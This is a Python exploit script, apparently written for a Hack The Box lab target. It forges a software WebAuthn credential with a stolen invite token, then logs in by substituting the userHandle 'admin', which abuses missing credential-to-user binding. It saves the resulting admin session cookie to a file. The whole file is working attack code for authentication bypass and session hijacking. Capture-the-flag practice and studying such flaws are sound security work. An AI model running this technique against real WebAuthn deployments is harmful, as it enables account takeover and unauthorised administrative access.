#!/usr/bin/env python3
"""WebAuthn register + admin login for AEGIS / Odyssey."""
import os
import json
import hashlib
import struct
import pickle
import sys
import requests
import cbor2
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE = "http://10.129.115.125:3000"
RP_ID = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"
HEADERS = {"Host": "aegis.korvia.htb"}
CRED_PATH = os.path.join(os.path.dirname(__file__), "aegis_cred.pkl")


def register(token: str) -> None:
    s = requests.Session()
    s.headers.update(HEADERS)
    r = s.post(
        f"{BASE}/api/v1/auth/webauthn/register/begin",
        json={"invite_token": token},
        timeout=60,
    )
    print("[+] register/begin:", r.status_code, r.text[:300])
    r.raise_for_status()
    opts = r.json()
    challenge = websafe_decode(opts["challenge"])
    user_id = websafe_decode(opts["user"]["id"])
    print(f"[+] reserved operator user_id: {user_id.decode()}")

    priv = ec.generate_private_key(ec.SECP256R1())
    pn = priv.public_key().public_numbers()
    i2b = lambda n: n.to_bytes(32, "big")
    cose_pub = {1: 2, 3: -7, -1: 1, -2: i2b(pn.x), -3: i2b(pn.y)}
    cred_id = os.urandom(32)
    rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
    flags = 0x41  # UP | AT
    counter = struct.pack(">I", 1)
    aaguid = b"\x00" * 16
    attested = aaguid + struct.pack(">H", len(cred_id)) + cred_id + cbor2.dumps(cose_pub)
    auth_data = rp_id_hash + bytes([flags]) + counter + attested
    attestation_obj = cbor2.dumps({"fmt": "none", "attStmt": {}, "authData": auth_data})
    client_data = json.dumps(
        {
            "type": "webauthn.create",
            "challenge": websafe_encode(challenge),
            "origin": ORIGIN,
            "crossOrigin": False,
        },
        separators=(",", ":"),
    ).encode()
    body = {
        "id": websafe_encode(cred_id),
        "rawId": websafe_encode(cred_id),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(client_data),
            "attestationObject": websafe_encode(attestation_obj),
        },
        "clientExtensionResults": {},
    }
    r = s.post(f"{BASE}/api/v1/auth/webauthn/register/finish", json=body, timeout=60)
    print(f"[+] register/finish: {r.status_code} {r.text}")
    r.raise_for_status()
    priv_pem = priv.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    with open(CRED_PATH, "wb") as f:
        pickle.dump({"priv_pem": priv_pem, "cred_id": cred_id, "user_id": user_id}, f)
    print(f"[+] credential saved to {CRED_PATH}")


def login(as_admin: bool = True) -> str:
    data = pickle.load(open(CRED_PATH, "rb"))
    priv = serialization.load_pem_private_key(data["priv_pem"], password=None)
    cred_id = data["cred_id"]
    user_id = b"admin" if as_admin else data["user_id"]
    print(f"[+] loaded credential; userHandle={user_id!r}")

    s = requests.Session()
    s.headers.update(HEADERS)
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={}, timeout=60)
    r.raise_for_status()
    challenge = websafe_decode(r.json()["challenge"])
    rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
    flags = 0x01  # UP
    counter = struct.pack(">I", 2)
    auth_data = rp_id_hash + bytes([flags]) + counter
    client_data = json.dumps(
        {
            "type": "webauthn.get",
            "challenge": websafe_encode(challenge),
            "origin": ORIGIN,
            "crossOrigin": False,
        },
        separators=(",", ":"),
    ).encode()
    to_sign = auth_data + hashlib.sha256(client_data).digest()
    sig = priv.sign(to_sign, ec.ECDSA(hashes.SHA256()))
    body = {
        "id": websafe_encode(cred_id),
        "rawId": websafe_encode(cred_id),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(client_data),
            "authenticatorData": websafe_encode(auth_data),
            "signature": websafe_encode(sig),
            "userHandle": websafe_encode(user_id),
        },
        "clientExtensionResults": {},
    }
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body, timeout=60)
    print(f"[+] auth/finish: {r.status_code} {r.text}")
    r.raise_for_status()
    sid = s.cookies.get("aegis.sid")
    print(f"[+] session cookie: aegis.sid={sid}")
    open(os.path.join(os.path.dirname(__file__), "session_cookie.txt"), "w").write(sid or "")
    return sid, s


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "all"
    if cmd in ("register", "all"):
        token = sys.argv[2] if len(sys.argv) > 2 else None
        if not token:
            invites = json.load(open(os.path.join(os.path.dirname(__file__), "invites.json"), encoding="utf-8"))
            token = invites[0]["x"][0]["token"]
            print("[+] using token", token)
        register(token)
    if cmd in ("login", "all", "admin"):
        login(as_admin=True)
